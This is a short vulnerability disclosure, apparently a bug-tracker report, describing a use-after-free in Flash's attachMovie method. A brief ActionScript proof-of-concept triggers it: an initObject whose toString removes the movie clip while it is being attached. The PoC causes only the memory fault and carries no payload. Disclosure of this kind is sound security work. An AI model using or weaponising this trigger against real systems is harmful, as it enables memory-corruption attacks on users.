There is a use-after-free in attachMovie due to the initObject. If the initObject contains an object that calls a method that deletes the movie clip that is being attached, a use-after-free occurs. A proof-of-concept is as follows:

n = {_quality : {toString : func}};
function func(){

	trace("hello");

	newResetButton.removeMovieClip();
	return "test";
	}

_root.attachMovie("myResetButton","newResetButton",200, n);

A sample fla and swf are attached.
